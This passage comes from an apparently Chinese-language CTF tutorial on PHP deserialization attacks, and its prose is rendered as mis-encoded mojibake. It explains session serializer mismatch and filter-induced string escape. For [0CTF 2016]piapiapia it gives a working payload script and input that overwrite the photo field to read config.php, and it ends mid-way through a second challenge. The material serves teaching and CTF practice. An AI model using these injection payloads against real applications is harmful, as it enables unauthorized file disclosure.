</h2><p>sessionåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨åˆ°çš„å¼•æ“ä¸åŒ</p><p>ä¾‹å¦‚</p><ul><li><p>ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œåºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp</p><p>å‡è®¾è¦ä¿å­˜åˆ°sessionçš„æ•°æ®ä¸ºusername&#x3D;khaz</p><ul><li><p>phpæ€ä¹ˆçŸ¥é“è¦ä¿å­˜å“ªäº›æ•°æ®åˆ°sessionä¸­</p><blockquote><p>é€šè¿‡åœ¨$_SESSIONç¯å¢ƒå˜é‡æ³¨å†Œ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°†usernameå˜é‡ä¿å­˜åˆ°sessionä¸­</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¼šè¯ç»“æŸåï¼Œå°†$_SESSIONåºåˆ—åŒ–ä¿å­˜åˆ°sessionæ–‡ä»¶ä¸­ã€‚</p><p>æ­£å¸¸ä¿å­˜</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æ„é€ username&#x3D;|a:1:{s:8:â€passwdâ€;s:4:â€Khazâ€;}</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¬¬äºŒæ¬¡è¯·æ±‚ï¼Œååºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp_serialize</p><p>æ­£å¸¸</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br><span class="line">â†’ <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><p>æ”»å‡»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">â†’ <span class="variable">$_SESSION</span>[<span class="string">&#x27;passwd&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><blockquote><p>ä»è€Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰$_SESSIONç¯å¢ƒå˜é‡çš„å€¼</p></blockquote></li></ul><h1 id="è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—"><a href="#è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—" class="headerlink" title="è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—"></a>è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—</h1><h2 id="å½¢æˆåŸå› "><a href="#å½¢æˆåŸå› " class="headerlink" title="å½¢æˆåŸå› "></a>å½¢æˆåŸå› </h2><p>phpååºåˆ—åŒ–ç‰¹ç‚¹</p><ul><li>ä»¥}ä½œä¸ºç»“æŸç¬¦ï¼Œåœ¨}ä¹‹åçš„å­—ç¬¦ä¼šè¢«èˆå»</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;fdafadf&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ååºåˆ—åŒ–æ—¶ä¼šæ ¹æ®å‰é¢ç»™å®šçš„é•¿åº¦ï¼Œè¯»å–å¯¹åº”é•¿åº¦çš„å­—ç¬¦ä¸²</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;&quot;&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//s:4:&quot;(a&quot;;&quot;)&quot;; æ‹¬å·åªæ˜¯æ ‡æ³¨å¤„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">//é•¿åº¦ä¸º4ä»ç¬¬ä¸€ä¸ª&quot;å¼€å§‹è¯»å–4ä¸ªå­—ç¬¦a&quot;;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&quot;;&quot;&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å½“åºåˆ—åŒ–çš„é•¿åº¦&#x2F;æ•°é‡ä¸å®é™…ä¸ç¬¦æ—¶ï¼Œååºåˆ—åŒ–ä¼šæŠ¥é”™</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//s:4:&quot;a&quot;; é•¿åº¦ä¸º4ï¼Œå®é™…å­—ç¬¦ä¸²ä¸ºaï¼Œé•¿åº¦ä¸º1</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:3:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//a:3è¯´æ˜æœ‰ä¸‰ä¸ªå€¼ï¼Œå®é™…ä¸Ša=&gt;1,b=&gt;2,åªæœ‰ä¸¤ä¸ªå€¼</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">error  </span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>å½“å­˜åœ¨ä»¥ä¸‹æµç¨‹ï¼šåºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ–</p><ul><li><p>è¿‡æ»¤ï¼šåœ¨å¯¹å¯æ§å˜é‡è¿›è¡Œè¿‡æ»¤äº†ä¹‹åï¼Œå°±ä¼šä½¿å¾—å…¶åºåˆ—åŒ–çš„é•¿åº¦ä¸å­—ç¬¦ä¸²é•¿åº¦ä¸åŒ¹é…ï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œæ— æ³•æ‰§è¡Œååºåˆ—åŒ–ï¼Œå°±ä¸ä¼šæ‰§è¡Œæ”»å‡»è€…æ„é€ çš„æ”»å‡»ä»£ç ã€‚ä½†æ˜¯åˆ©ç”¨å‰é¢æåˆ°çš„ç¬¬ä¸€å’Œç¬¬äºŒä¸ªç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ†æè¿‡æ»¤å‰åå­—ç¬¦ä¸²é•¿åº¦çš„å˜åŒ–ï¼Œæ„é€ å­—ç¬¦ä¸²(å­—ç¬¦ä¸²å½¢å¼ä¸ºè¢«è¿‡æ»¤å­—ç¬¦+ç›®æ ‡å­ä¸²)æ¥è¦†ç›–å…¶ä»–å˜é‡ã€‚</p></li><li><p>ç›®æ ‡å­—ä¸²ï¼š</p><p><code>&quot;;+åºåˆ—åŒ–åçš„å˜é‡+&#125;</code></p><p>ä¾‹å¦‚æˆ‘æƒ³è¦é€ƒé€¸<code>$name=&#39;khaz&#39;</code>ï¼Œé‚£ä¹ˆç›®æ ‡å­—ä¸²ä¸º<code>&quot;;s:4:&quot;name&quot;;s:4:&quot;khaz&quot;;&#125;</code></p></li></ul><h2 id="åˆ†ç±»å’Œæ€è·¯"><a href="#åˆ†ç±»å’Œæ€è·¯" class="headerlink" title="åˆ†ç±»å’Œæ€è·¯"></a>åˆ†ç±»å’Œæ€è·¯</h2><h3 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å¤š" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å¤š"></a>è¿‡æ»¤åå­—ç¬¦å˜å¤š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šè®©è¿‡æ»¤åçš„å­—ç¬¦ä¸²å¡«å……å®Œé•¿åº¦ï¼Œä»è€Œè®©åé¢çš„å˜é‡è§£æ”¾å‡ºæ¥</span><br><span class="line">éœ€è¦è®¡ç®—ç›®æ ‡å­—ä¸²çš„é•¿åº¦l1å’Œè¿‡æ»¤åå¢åŠ çš„é•¿åº¦l2</span><br><span class="line">payload:è¢«è¿‡æ»¤å­—ç¬¦*(l1/l2)+ç›®æ ‡å­ä¸²</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡è®¾å¯¹å˜é‡<span class="variable">$a</span>è¿›è¡Œè¿‡æ»¤</span><br><span class="line">è¿‡æ»¤è§„åˆ™ï¼šaâ†’bb</span><br><span class="line"><span class="variable">$a</span>ä¸­çš„æ¯ä¸ªaåœ¨è¿‡æ»¤åéƒ½ä¼šä½¿å­—ç¬¦ä¸²é•¿åº¦åŠ <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">å‡è®¾ç›®æ ‡å­ä¸²ä¸ºï¼š<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125; ä¸€å…±31ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="string">å°±éœ€è¦é‡å¤a31æ¬¡ï¼Œæ„é€ <span class="subst">$a</span>=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">è¿™æ ·åºåˆ—åŒ–åæœ‰ï¼š</span></span><br><span class="line"><span class="string">s:62:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span></span><br><span class="line"><span class="string">æ­¤æ—¶é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¿‡æ»¤åï¼š</span></span><br><span class="line"><span class="string">s:62:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string">é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">ä»è€Œä½¿s:8:&quot;password&quot;;s:6:&quot;123456&quot;;è§£æ”¾å‡ºæ¥</span></span><br></pre></td></tr></table></figure><h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p><a href="http://www.zipå¾—åˆ°æºç ,å®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹/">www.zipå¾—åˆ°æºç ï¼Œå®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹</a></p><ol><li><p>flagåœ¨config.php</p></li><li><p>è¿‡æ»¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨_ä»£æ›¿\å’Œ\\</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨hackerä»£æ›¿array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;)</span></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é€ƒé€¸ï¼šå­—ç¬¦ä¸²å˜å¤š whereï¼š5  â†’  hackerï¼š6  </p></li><li><p>ååºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é€ƒé€¸è¦†ç›–$photoä¸ºconfig.php</p></li><li><p>åºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure></li><li><p>æ­£åˆ™</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#11ä½æ•°å­—</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxx@xxx.xxx xxxé™åˆ¶[_a-zA-Z0-9]</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#é•¿åº¦&lt;=10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦ç»•è¿‡nicknameçš„æ­£åˆ™ï¼Œç”¨æ•°ç»„ç»•è¿‡å³å¯ã€‚</p></li></ol><p>éœ€è¦é€ƒé€¸çš„å˜é‡ä¸º<code>$photo=&#39;config.php&#39;</code>ï¼Œç›®æ ‡å­ä¸²ä¸º<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œå…±33ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªwhereåœ¨æ›¿æ¢åé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥éœ€è¦33ä¸ªwhereã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;734541725@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;sadasd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–åï¼š&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">320</span>) <span class="string">&quot;a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;</span><br><span class="line">ååºåˆ—åŒ–åï¼šE:\æµè§ˆå™¨ä¸‹è½½\chrome\æ–°å»ºæ–‡ä»¶å¤¹\<span class="number">2</span>.php:<span class="number">21</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;phone&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;12345678901&quot;</span></span><br><span class="line">  <span class="string">&#x27;email&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;734541725@qq.com&quot;</span></span><br><span class="line">  <span class="string">&#x27;nickname&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">198</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  <span class="string">&#x27;photo&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹å°±æ˜¯å› ä¸ºè¦ç»•è¿‡æ­£åˆ™ï¼Œæ‰€ä»¥nicknameâ†’nickname[]ï¼Œæ•°ç»„åºåˆ—åŒ–åå°±éœ€è¦é—­åˆ{ï¼Œæ‰€ä»¥</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>34ä¸ªwhereï¼Œå¹¶ä¸”éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª}æ¥é—­åˆå¤šå‡ºçš„{</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;a:1:&#123;i:0;a:1:&#123;i:0;i:1;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" /><h3 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å°‘"></a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼Œä¼šåƒæ‰åé¢çš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦</span><br><span class="line">è§ä¸‹é¢ä¾‹å­ï¼Œå› ä¸ºè¿™ç§æƒ…å†µéœ€è¦è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²æ‰èƒ½å¾—åˆ°è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯åƒè¿‡æ»¤åå­—ç¬¦å˜å¤šé‚£æ ·å¯ä»¥ç›´æ¥æ„é€ ã€‚</span><br></pre></td></tr></table></figure><h4 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><p>è¿‡æ»¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">   